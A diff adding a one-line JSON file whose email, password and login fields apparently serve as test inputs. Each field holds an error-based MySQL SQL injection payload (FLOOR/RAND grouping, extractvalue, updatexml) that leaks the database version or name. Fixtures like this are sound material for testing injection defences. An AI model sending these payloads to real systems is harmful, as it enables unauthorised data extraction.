@@ -1,0 +1,1 @@
+{"email": "test' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--", "password": "admin' AND extractvalue(1,concat(0x7e,database()))--", "login": "user' AND updatexml(null,concat(0x0a,version()),null)--"}
